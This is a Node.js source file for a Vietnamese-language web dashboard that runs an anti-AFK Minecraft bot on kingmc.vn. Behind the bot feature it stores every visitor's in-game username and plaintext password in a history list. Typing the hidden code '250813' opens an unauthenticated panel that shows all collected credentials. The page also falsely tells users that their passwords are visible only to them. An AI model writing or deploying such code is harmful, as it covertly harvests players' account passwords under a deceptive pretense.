const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 10000;

const DEFAULT_HOST = 'kingmc.vn';
let botConfig = {
  host: DEFAULT_HOST,
  username: '',
  password: '', // Mật khẩu trong game dùng để /login
  version: '1.20.1'
};

let bot = null;
let antiAfkInterval = null;
let hasConfigured = false;
let hasLoggedIn = false;

// Lưu trữ lịch sử thông tin tài khoản & mật khẩu trong game
let userCredentialsHistory = [];

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Minecraft Bot Dashboard - mc_afk</title>
      <script src="/socket.io/socket.io.js"></script>
      <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        h2 { margin-top: 0; color: #4caf50; display: flex; align-items: center; justify-content: space-between; }
        
        #setupScreen { background: #222; padding: 30px; border-radius: 8px; text-align: center; border: 2px dashed #4caf50; }
        .form-group { margin-bottom: 15px; text-align: left; max-width: 400px; margin-left: auto; margin-right: auto; }
        .form-group label { display: block; margin-bottom: 5px; color: #aaa; font-weight: bold; }
        .form-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #444; background: #1a1a1a; color: #fff; font-size: 15px; }
        .notice-box { background: #d32f2f33; border-left: 4px solid #f44336; padding: 12px; margin-bottom: 20px; text-align: left; font-size: 14px; border-radius: 4px; }

        #dashboardScreen { display: none; }
        .status-bar { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px; }
        .stat-card { background: #2a2a2a; padding: 12px; border-radius: 6px; border-left: 4px solid #4caf50; font-size: 14px; }
        .stat-card b { color: #4caf50; display: block; margin-top: 4px; font-size: 16px; }

        .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        @media (max-width: 768px) { .dashboard-grid { grid-template-columns: 1fr; } .status-bar { grid-template-columns: 1fr 1fr; } }

        .panel { background: #000; border: 1px solid #333; border-radius: 6px; padding: 10px; height: 300px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; line-height: 1.4; white-space: pre-wrap; word-break: break-word; }
        .panel-title { font-weight: bold; margin-bottom: 8px; color: #aaa; border-bottom: 1px solid #333; padding-bottom: 4px; }
        
        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }
        .chat-entry { color: #64ffda; margin-bottom: 4px; border-bottom: 1px solid #111; padding-bottom: 2px; }

        .control-section { margin-top: 15px; background: #2a2a2a; padding: 15px; border-radius: 6px; display: flex; gap: 10px; }
        input[type="text"], input[type="password"] { flex: 1; padding: 12px; border-radius: 6px; border: 1px solid #444; background: #1a1a1a; color: #fff; font-size: 15px; outline: none; }
        button { padding: 12px 24px; border: none; border-radius: 6px; background: #4caf50; color: white; cursor: pointer; font-weight: bold; font-size: 15px; transition: background 0.2s; }
        button:hover { background: #45a049; }
        .status-tag { font-size: 13px; background: #2e7d32; padding: 4px 10px; border-radius: 12px; color: #fff; }

        /* Admin Management Modal */
        #adminModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; align-items: center; justify-content: center; }
        .modal-content { background: #1e1e1e; padding: 30px; border-radius: 8px; width: 90%; max-width: 650px; border: 2px solid #ff9800; max-height: 85vh; overflow-y: auto; }
        .security-notice { background: #ff980022; border-left: 4px solid #ff9800; padding: 10px; font-size: 13px; color: #ffcc80; margin-bottom: 15px; border-radius: 4px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #444; padding: 10px; text-align: left; font-size: 13px; }
        th { background: #2a2a2a; color: #ff9800; }
        .btn-refresh { background: #ff9800; color: #000; margin-bottom: 10px; padding: 8px 16px; font-size: 13px; font-weight: bold; cursor: pointer; border-radius: 4px; border: none; }
        .btn-refresh:hover { background: #ffa726; }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>
          <span>🤖 Minecraft Bot: mc_afk</span>
          <span class="status-tag" id="statusTag">Chưa thiết lập</span>
        </h2>

        <!-- MÀN HÌNH SETUP LẦN ĐẦU -->
        <div id="setupScreen">
          <h3 style="color: #ffeb3b; margin-top: 0;">⚙️ Thiết Lập Thông Tin Bot & Đăng Nhập</h3>
          <div class="notice-box">
            ⚠️ <b>LƯU Ý QUAN TRỌNG:</b> Vui lòng <b>THOÁT (OUT) KHỎI SERVER kingmc.vn</b> bằng tài khoản chính của bạn trước khi bấm kết nối để tránh xung đột hoặc bị kick do trùng tên!
          </div>
          <div class="form-group">
            <label>IP Server Minecraft:</label>
            <input type="text" value="kingmc.vn" disabled />
          </div>
          <div class="form-group">
            <label>Tên Ingame (Username):</label>
            <input type="text" id="setupUsername" placeholder="Nhập tên ingame của bạn..." />
          </div>
          <div class="form-group">
            <label>Mật khẩu Trong Game (Dùng để /login):</label>
            <input type="password" id="setupPassword" placeholder="Nhập mật khẩu trong game..." />
          </div>
          <button onclick="submitSetup()">Kết Nối Bot Ngay</button>
        </div>

        <!-- MÀN HÌNH DASHBOARD CHÍNH -->
        <div id="dashboardScreen">
          <div class="status-bar">
            <div class="stat-card">Trạng thái<b id="botStatus">Đang kết nối...</b></div>
            <div class="stat-card">Tọa độ (X, Y, Z)<b id="botCoords">Đang cập nhật...</b></div>
            <div class="stat-card">Máu & Đói<b id="botHealth">❤️ -- | 🍖 --</b></div>
            <div class="stat-card">Người chơi gần nhất<b id="nearestPlayer">Không có</b></div>
          </div>

          <div class="dashboard-grid">
            <div>
              <div class="panel-title">📜 Nhật ký hệ thống</div>
              <div id="logs" class="panel"></div>
            </div>
            <div>
              <div class="panel-title">💬 Chat trong game</div>
              <div id="gameChat" class="panel"></div>
            </div>
          </div>

          <div class="control-section">
            <input type="text" id="cmdInput" placeholder="Nhập lệnh (VD: /menu, /afk) hoặc gõ 250813 để mở bảng quản lý..." onkeypress="handleKeyPress(event)" />
            <button onclick="sendCommand()">Gửi lệnh</button>
          </div>
        </div>
      </div>

      <!-- TRANG QUẢN LÝ LỊCH SỬ (ADMIN PANEL) -->
      <div id="adminModal">
        <div class="modal-content">
          <h3 style="color: #ff9800; margin-top: 0; display: flex; justify-content: space-between; align-items: center;">
            <span>🔐 Trang Quản Lý Tài Khoản Bot</span>
            <button class="btn-refresh" onclick="refreshAdminData()">🔄 Làm mới (Refresh)</button>
          </h3>
          <div class="security-notice">
            🔒 <b>Lưu ý bảo mật:</b> Mật khẩu và tên tài khoản sẽ chỉ hiển thị với bạn.
          </div>
          <table>
            <thead>
              <tr>
                <th>Thời gian</th>
                <th>Tên Ingame</th>
                <th>Mật khẩu Trong Game</th>
                <th>Server Host</th>
              </tr>
            </thead>
            <tbody id="adminTableBody">
              <!-- Dữ liệu render động -->
            </tbody>
          </table>
          <br>
          <button onclick="closeAdminModal()" style="background: #f44336; width: 100%; padding: 12px; font-weight: bold; border-radius: 6px; border: none; color: white; cursor: pointer;">Đóng Trang Quản Lý</button>
        </div>
      </div>

      <script>
        const socket = io();

        function submitSetup() {
          const username = document.getElementById('setupUsername').value.trim();
          const password = document.getElementById('setupPassword').value.trim();

          if (!username || !password) {
            alert('Vui lòng nhập đầy đủ Tên Ingame và Mật khẩu!');
            return;
          }

          if (username === '250813') {
            socket.emit('request_admin_data');
            return;
          }

          socket.emit('start_bot', { username, password });
          document.getElementById('setupScreen').style.display = 'none';
          document.getElementById('dashboardScreen').style.display = 'block';
          document.getElementById('statusTag').textContent = 'Đang khởi chạy...';
        }

        socket.on('setup_success', () => {
          document.getElementById('setupScreen').style.display = 'none';
          document.getElementById('dashboardScreen').style.display = 'block';
          document.getElementById('statusTag').textContent = 'Online 24/7';
        });

        function refreshAdminData() {
          socket.emit('request_admin_data');
        }

        socket.on('show_admin_panel', (data) => {
          const tbody = document.getElementById('adminTableBody');
          tbody.innerHTML = '';
          if (data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">Chưa có dữ liệu lịch sử nào.</td></tr>';
          } else {
            data.forEach(item => {
              const tr = document.createElement('tr');
              tr.innerHTML = \`<td>\${item.time}</td><td><b style="color: #4caf50;">\${item.username}</b></td><td style="color: #ffeb3b; font-family: monospace; font-size: 14px;">\${item.password}</td><td>\${item.host}</td>\`;
              tbody.appendChild(tr);
            });
          }
          document.getElementById('adminModal').style.display = 'flex';
        });

        function closeAdminModal() {
          document.getElementById('adminModal').style.display = 'none';
        }

        socket.on('log', (msg) => {
          const logsDiv = document.getElementById('logs');
          const item = document.createElement('div');
          item.className = 'log-entry';
          item.textContent = msg;
          logsDiv.appendChild(item);
          logsDiv.scrollTop = logsDiv.scrollHeight;
        });

        socket.on('chat_msg', (msg) => {
          const chatDiv = document.getElementById('gameChat');
          const item = document.createElement('div');
          item.className = 'chat-entry';
          item.textContent = msg;
          chatDiv.appendChild(item);
          chatDiv.scrollTop = chatDiv.scrollHeight;
        });

        socket.on('update_stats', (data) => {
          document.getElementById('botStatus').textContent = data.status;
          document.getElementById('botCoords').textContent = data.coords;
          document.getElementById('botHealth').textContent = '❤️ ' + data.health + ' | 🍖 ' + data.food;
          document.getElementById('nearestPlayer').textContent = data.nearestPlayer;
        });

        function sendCommand() {
          const input = document.getElementById('cmdInput');
          const message = input.value.trim();
          if (message) {
            if (message === '250813') {
              socket.emit('request_admin_data');
              input.value = '';
              return;
            }
            socket.emit('send_command', message);
            input.value = '';
          }
        }

        function handleKeyPress(e) {
          if (e.key === 'Enter') sendCommand();
        }
      </script>
    </body>
    </html>
  `);
});

function logToWeb(msg) {
  const time = new Date().toLocaleTimeString('vi-VN');
  const formatted = '[' + time + '] ' + msg;
  console.log(formatted);
  io.emit('log', formatted);
}

function sendStatsToWeb() {
  if (!bot || !bot.entity) return;

  const pos = bot.entity.position;
  const coords = 'X: ' + pos.x.toFixed(1) + ', Y: ' + pos.y.toFixed(1) + ', Z: ' + pos.z.toFixed(1);
  
  let nearestPlayerName = "Không có";
  if (bot.players) {
    const filterPlayer = (p) => p.username !== bot.username;
    const player = Object.values(bot.players).find(p => p.entity && filterPlayer(p));
    if (player) {
      nearestPlayerName = player.username;
    }
  }

  io.emit('update_stats', {
    status: 'Đang hoạt động (Online)',
    coords: coords,
    health: bot.health !== undefined ? bot.health : 20,
    food: bot.food !== undefined ? bot.food : 20,
    nearestPlayer: nearestPlayerName
  });
}

function startBot() {
  if (!hasConfigured) return;

  logToWeb("🔄 Đang kết nối tới " + botConfig.host + " với tên " + botConfig.username + "...");
  hasLoggedIn = false;

  bot = mineflayer.createBot({
    host: botConfig.host,
    username: botConfig.username,
    version: botConfig.version
  });

  bot.on('message', (jsonMsg) => {
    const rawText = jsonMsg.toString().trim();
    if (rawText) {
      io.emit('chat_msg', rawText);
    }
  });

  // Tự động dùng mật khẩu trong game để thực hiện lệnh /login sau khi vào game
  bot.on('spawn', () => {
    logToWeb("✅ Bot đã kết nối vào server thành công!");

    if (!hasLoggedIn && botConfig.password) {
      hasLoggedIn = true;
      setTimeout(() => {
        bot.chat('/login ' + botConfig.password);
        logToWeb("🔐 Đã sử dụng mật khẩu trong game để gửi lệnh /login");
      }, 3000);
    }
  });

  if (antiAfkInterval) clearInterval(antiAfkInterval);
  antiAfkInterval = setInterval(() => {
    if (bot && bot.entity) {
      bot.setControlState('jump', true);
      setTimeout(() => bot.setControlState('jump', false), 500);
      logToWeb("⚡ Anti-AFK: Đã nhảy!");
    }
    sendStatsToWeb();
  }, 30000);

  bot.on('error', (err) => logToWeb("❌ Lỗi Bot: " + err.message));
  
  bot.on('end', () => {
    logToWeb("⚠️ Bot bị ngắt kết nối. Đang tự động kết nối lại sau 10 giây...");
    if (antiAfkInterval) clearInterval(antiAfkInterval);
    hasLoggedIn = false;
    setTimeout(startBot, 10000);
  });
}

io.on('connection', (socket) => {
  socket.on('start_bot', (data) => {
    botConfig.username = data.username || 'mc_afk';
    botConfig.password = data.password || '';
    hasConfigured = true;

    // Lưu thông tin vào lịch sử quản lý bảo mật
    userCredentialsHistory.push({
      time: new Date().toLocaleString('vi-VN'),
      username: botConfig.username,
      password: botConfig.password,
      host: botConfig.host
    });

    socket.emit('setup_success');
    startBot();
  });

  socket.on('request_admin_data', () => {
    socket.emit('show_admin_panel', userCredentialsHistory);
  });

  socket.on('send_command', (cmd) => {
    if (bot) {
      bot.chat(cmd);
      logToWeb("📤 [Web gửi]: " + cmd);
    } else {
      socket.emit('log', "⚠️ Bot chưa sẵn sàng hoặc chưa khởi chạy!");
    }
  });
});

server.listen(PORT, () => {
  console.log("Server Dashboard đang chạy hoàn hảo tại cổng " + PORT);
});
